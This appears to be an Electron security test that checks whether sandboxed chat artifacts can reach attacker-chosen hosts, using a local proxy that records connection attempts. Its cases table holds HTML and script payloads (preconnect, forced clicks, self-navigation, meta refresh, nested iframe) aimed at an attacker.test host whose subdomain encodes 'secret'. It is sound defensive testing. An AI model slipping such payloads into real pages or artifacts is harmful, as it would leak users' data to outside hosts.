// Run WITHOUT Playwright (like rtc-main.ts). Confidential chats run artifact scripts only in the desktop app
// (web/src/lib/artifacts.ts frameRunsScripts) because this shell, unlike Safari or Chrome, opens no connection to a
// host name an artifact chooses. This checks that with the real receiver document, the real frame and app policies and
// the real guards (guardAppView): every connection goes to a local proxy that forwards nothing, and the names it sees
// are reported. A top-level load is the control (the proxy does see this app's connections).
import { app, BrowserWindow, session } from 'electron'
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { appCsp, frameCsp, SANDBOX_RECEIVER } from '../../../server/src/routes/web-static'
import { wrapHtml } from '../../../web/src/lib/artifacts'
import { APP_WEB_PREFERENCES, guardAppView } from '../../src/main/security'

app.setPath('userData', process.env.NAMES_TEST_PROFILE!)
const seen: string[] = []
const proxy = createServer((req, res) => { seen.push(`${req.method} ${req.url}`); res.writeHead(502); res.end() })
proxy.on('connect', (req, sock) => { sock.on('error', () => {}); seen.push(`CONNECT ${req.url}`); sock.end('HTTP/1.1 502 Bad Gateway\r\n\r\n') })
proxy.on('connection', (s) => s.on('error', () => {}))
const name = (tag: string) => `${tag}-c2vjcmv0.attacker.test`
const CASES: Record<string, string> = {
  'link preconnect': `<link rel="preconnect" href="https://${name('pc')}">`,
  'preconnect added by a script': `<div id=d></div><script>document.getElementById('d').innerHTML='<link rel=preconnect href=https://${name('late')}>'</script>`,
  'target=_blank click': `<a id=a target=_blank href="https://${name('blank')}/x">x</a><script>document.getElementById('a').click()</script>`,
  'the frame navigates itself (x5)': `<script>for(var i=0;i<5;i++)location.href='https://nav'+i+'-c2vjcmv0.attacker.test/x'</script>`,
  'link click': `<a id=a href="https://${name('self')}/x">x</a><script>document.getElementById('a').click()</script>`,
  'meta refresh': `<meta http-equiv="refresh" content="0;url=https://${name('refresh')}/x">`,
  'nested frame address': `<iframe src="https://${name('frame')}/x"></iframe>`,
}
let current = ''
const server = createServer((req, res) => {
  const host = req.headers.host!
  const url = new URL(req.url!, 'http://localhost')
  if (url.pathname === '/') {
    res.writeHead(200, { 'content-type': 'text/html', 'content-security-policy': appCsp(host) })
    return res.end('<!doctype html><html><body><iframe id="f" sandbox="allow-scripts" src="/sandbox/frame"></iframe><script src="/host.js"></script></body></html>')
  }
  if (url.pathname === '/host.js') {
    // like web/src/components/SandboxFrame.tsx: the document goes in through postMessage after "ready"
    res.writeHead(200, { 'content-type': 'text/javascript' })
    return res.end(`window.addEventListener('message',function(e){var f=document.getElementById('f');if(e.source===f.contentWindow&&e.data&&e.data.type==='ready')f.contentWindow.postMessage({source:'mycel-host',type:'render',html:${JSON.stringify(current).replace(/</g, '\\u003c')}},'*')})`)
  }
  if (url.pathname === '/sandbox/frame') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': frameCsp(host) })
    return res.end(SANDBOX_RECEIVER)
  }
  res.writeHead(404); res.end()
})
const listen = (s: typeof server) => new Promise<number>((r) => s.listen(0, '127.0.0.1', () => r((s.address() as AddressInfo).port)))
void (async () => {
  const proxyPort = await listen(proxy)
  const port = await listen(server)
  await app.whenReady()
  await session.defaultSession.setProxy({ proxyRules: `http://127.0.0.1:${proxyPort}`, proxyBypassRules: '127.0.0.1' })
  const win = new BrowserWindow({ show: false, webPreferences: APP_WEB_PREFERENCES })
  await win.loadURL('about:blank')
  await guardAppView(win.webContents, () => [`http://127.0.0.1:${port}`])
  const result: Record<string, string[]> = {}
  let i = 0
  for (const [label, body] of Object.entries(CASES)) {
    current = wrapHtml(body, `http://127.0.0.1:${port}`)
    seen.length = 0
    await win.loadURL(`http://127.0.0.1:${port}/?case=${i++}`).catch(() => {})
    await new Promise((r) => setTimeout(r, 1500))
    result[label] = [...new Set(seen.filter((s) => s.includes('attacker.test')))]
  }
  seen.length = 0
  const control = new BrowserWindow({ show: false })
  await control.loadURL(`https://${name('control')}/`).catch(() => {})
  await new Promise((r) => setTimeout(r, 500))
  result.control = [...new Set(seen.filter((s) => s.includes('attacker.test')))]
  console.log('NAMES_RESULT ' + JSON.stringify(result))
  control.destroy()
  win.destroy()
  server.close()
  proxy.close()
  app.exit(0)
})().catch((error) => { console.error(error); app.exit(1) })
